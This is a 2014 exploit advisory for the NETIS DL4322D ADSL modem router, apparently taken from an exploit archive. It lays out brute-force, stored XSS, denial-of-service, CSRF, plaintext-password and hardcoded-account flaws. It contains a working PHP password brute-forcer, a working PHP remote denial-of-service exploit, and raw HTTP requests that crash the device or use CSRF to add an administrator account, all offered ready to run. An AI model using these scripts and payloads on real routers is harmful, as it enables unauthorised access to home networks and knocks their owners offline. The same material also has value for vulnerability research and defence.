@@ -1,0 +1,285 @@
+id: 22767
+date: 10/17/2014
+title: NETIS DL4322D Multiple Vulnerabilities
+author: AkaStep
+cves: 
+
+Vulnerable Device:
+NETIS DL4322D 300Mbps Wireless N ADSL2+ Modem Router Multiple vulnerabilites
+(Other models of netis may also suffer from this vulns)
+Vendor: http://www.netis-systems.com
+Product overview:
+http://www.netis-systems.com/en/products/ADSL2+-Wireless-Modem-Router/941.html
+
+The netis DL4322D is a 3-in-1 device that combines the functions of a high speed ADSL2+ modem, 4-port NAT router and wireless N access point. It is designed to provide end-users with a one-stop solution to acquiring and sharing high-speed Internet access over a wired/wireless network. Supporting the latest ADSL standards, the DL4322D brings with it much higher speed than dial-up connections. It also provides some practical functions, such as Port Mapping for IPTV, Ethernet WAN, SNMP, IPv6, TR-069 and more. With this product, users can now enjoy more kinds of heavy bandwidth consuming applications like wireless HD video streaming.
+
+
+===================================
+Vulns: Bruteforce/XSS/Denial Of Service(UnAuthenticated/Authenticated)/CSRF/
+Plaintext Passwords/HardCoded Usernames
+
+===================================
+0) Bruteforce on login page:
+ http://192.168.1.1/login.cgi
+There is no any anti-bruteforce implementation exists. (FULL PROOF CAPTCHA)
+So it is vulnerable to bruteforce.
+
+=========== BRUTEFORCER ============
+
+<?php
+$page='login.cgi';
+$usage='~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'. PHP_EOL . 'Usage:'. PHP_EOL . 
+
+'php -f brute.php guest/user  /tmp/dictionary.txt http://192.168.1.1/'. PHP_EOL . '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'. PHP_EOL;
+if(count($argv)!==4) die($usage);
+$uname=$argv[1];
+$passmassiv=$argv[2];
+$ip=$argv[3];
+$page=$ip . $page;
+$passmassiv=file($passmassiv) or die('Unable to open dictionary!');
+
+foreach($passmassiv as $pass)
+{
+
+$pass=trim($pass);
+$post='username=' . $uname.'&password=' .$pass . '&submit.htm%3Flogin.htm=Send';
+
+    $ch = curl_init();  
+    curl_setopt($ch,CURLOPT_URL,$page);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+    curl_setopt($ch,CURLOPT_HEADER, true); 
+    curl_setopt($ch, CURLOPT_POST, sizeof($post));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);    
+    $response=curl_exec($ch);
+
+if(!preg_match('/Username or password error/i',$response))
+
+{
+echo 'OWNED! ' . $uname . ' PASSWD: ' . $pass.   PHP_EOL;
+exit;
+}
+else
+{
+echo ' Verifying user: => ' . $uname . '  TRYING AS PASS:=>  ' . $pass. PHP_EOL;
+}
+
+
+
+}
+
+unset($pass);
+
+?>
+
+======== EOF BRUTEFORCER ==============
+
+
+
+
+===================================
+1) XSS via incorrect login:password attempts.
+
+Since web interface of this device default is open to PUBLIC there is a big chance to be owned.
+This  device has a capability to log incorrect login:password attempts.
+But it fails to sanitise user input and then it stores it in log.Administrator can view this log.
+Once administrator tries to view injected logs via web interface=game over.
+Exploitation:
+Using XSS redirect admin to 3'rd party site.
+Exploit CSRF flaws(it is up to you) add new admin/kick remote machine to DMZ and etc. then logon to device.
+
+SEE: XSS.png && unsanitized_input_passed.png
+
+http://s017.radikal.ru/i400/1410/84/a50fc523715a.jpg
+http://s50.radikal.ru/i130/1410/d3/dc9606d635a2.jpg 
+
+===================================
+2) Remote Unauthenticated Denial Of Service Exploit.
+Since web interface is open to PUBLIC:(default)
+
+
+<?php
+error_reporting(0);//On production lol
+/*******************************************
+ *  NETIS DL4322D Unauthenticated          * 
+ *  Remote DENIAL OF SERVICE EXPLOIT       *
+ * /AkaStep                                *
+ * On success this exploit simply          *
+ * reboots target's router                 *
+ * (Connections will be interrupted as well)*
+ * *****************************************/
+
+$page='login.cgi';
+$usage='~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'. PHP_EOL . 'NETIS DL4322D REMOTE DENIAL OF SERVICE EXPLOIT'. PHP_EOL .
+'Usage:'. PHP_EOL . 
+
+'php -f netisdos.php http://REMOTE_OR_LOCAL_IP/'. PHP_EOL . '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'. PHP_EOL;
+if(count($argv)!==2) die($usage);
+
+$ip=$argv[1];
+$page=$ip . $page;
+
+if(file_get_contents($ip . 'login.htm')) echo '[+] Target is Online! [+]'. PHP_EOL;
+sleep(3);
+echo '[+] Sending Payload!  [+]'. PHP_EOL;
+sleep(3);
+
+
+$payload=str_repeat('AKASTEP',500);
+$post='username=' . $payload.'&password=SAY HELLO TO BLACK HATS!&submit.htm%3Flogin.htm=Send';
+
+    $ch = curl_init();  
+    curl_setopt($ch,CURLOPT_URL,$page);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+    curl_setopt($ch,CURLOPT_HEADER, true); 
+    curl_setopt($ch, CURLOPT_TIMEOUT, 12);
+    curl_setopt($ch, CURLOPT_POST, sizeof($post));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);    
+    $response=curl_exec($ch);
+echo '[+] Payload WAS Sent... Please wait... [+]' .PHP_EOL;
+curl_close($ch);
+sleep(2);
+
+if(!file_get_contents($page)) echo('[+] Remote Target Down! [+]'. PHP_EOL);
+exit;
+
+
+?>
+
+
+
+
+
+===================================
+3) DOS (Authenticated) but can be combined with XSS+CSRF remotely.
+
+http://192.168.1.1/form2languageSelect.cgi
+
+HEADERS:
+
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: SessionID=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+If-Modified-Since: *
+
+
+
+
+DATA:
+selectLanguage=100&submit.htm%3Findex.htm=Send
+
+
+NOTE: Value 100 is illegal value that causes Denial Of service.
+Any current connection(s) will be broken permanently.
+
+[root@ metasploit]# nmap -sS -Pn 192.168.1.1 -p 80
+
+Starting Nmap 6.45 ( http://nmap.org ) at 2014-10-15 22:59 AZST
+Nmap done: 1 IP address (0 hosts up) scanned in 0.46 seconds
+
+
+
+[root@ metasploit]# nmap -sS -Pn 192.168.1.1 -p 80
+
+Starting Nmap 6.45 ( http://nmap.org ) at 2014-10-15 22:59 AZST
+Nmap done: 1 IP address (0 hosts up) scanned in 0.46 seconds
+[root@ metasploit]# nmap -sS -sU -PN -sV 192.168.1.1
+
+Starting Nmap 6.45 ( http://nmap.org ) at 2014-10-15 23:02 AZST
+Nmap done: 1 IP address (0 hosts up) scanned in 0.92 seconds
+[root@ metasploit]# ping 192.168.1.1
+PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
+
+
+Moreover after switching device to on/off states (aka multiple hard reboots) any attempt to access web interface will result in Denial Of service.(Device is somehow still poisoned in infinitive manner)
+
+
+
+[root@ metasploit]# ping 192.168.1.1
+PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
+From 192.168.1.102 icmp_seq=17 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=18 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=19 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=20 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=21 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=22 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=23 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=24 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=25 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=26 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=27 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=28 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=29 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=30 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=31 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=32 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=33 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=34 Destination Host Unreachable
+From 192.168.1.102 icmp_seq=35 Destination Host Unreachabl
+
+
+
+==========================================================================
+
+4) 
+Multiple CSRF vulns: (all forms is prone to CSRF because there is no any ANTI-CSRF implementation at all)
+
+Here is one while transmitting VIA POST request:
+
+URL:
+http://192.168.1.1/form2userconfig.cgi
+
+
+REQUEST HEADERS:
+
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: SessionID=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 127
+If-Modified-Since: *
+
+
+DATA TO POST:
+
+username=owned_device&privilege=2&newpass=aDhexLbT8&confpass=aDhexLbT8&adduser=Add&hiddenpass=&submit.htm%3Fuserconfig.htm=Send
+
+
+SEE: CSRF_VULNERABLE_FORMS.png
+
+http://s019.radikal.ru/i632/1410/3b/2d738ae75ec5.jpg
+
+
+==========================================================================
+5)
+
+Plaintext passwords
+
+
+SEE: PLAINTEXT_PASSWORDS_FROM_SOURCE_OF_PAGE.png
+
+http://s008.radikal.ru/i306/1410/88/be4c3e20fa10.jpg
+
+==========================================================================
+
+6) Hardcoded usernames.
+
+This device has 2 hardcoded accounts.
+guest and user
+guest  <= it has a root privilegie
+user <= is a limited user
+
+You can change paswords for them but you can't delete or rename them.
+
+#  0day.today [2023-03-24]  #
